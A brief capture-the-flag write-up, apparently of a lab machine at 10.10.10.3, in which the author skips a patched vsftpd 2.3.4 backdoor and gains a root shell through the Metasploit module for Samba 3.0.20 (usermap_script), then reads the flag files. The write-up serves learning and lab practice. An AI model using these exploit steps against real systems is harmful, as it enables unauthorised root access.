Few ports open. My first thought was FTP since it was running the imfamous vsftpd 2.3.4 but it seems the backdoor was patched. Next step was to check out SMB which is running version 3.0.20. Turns out metasploit as an exploit for exactly that version. Using `exploit/multi/samba/usermap_script` I get a root shell
```
msf5 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > run

From here I can read the `user.txt` and `root.txt` flags.
```
cat /home/makis/user.txt
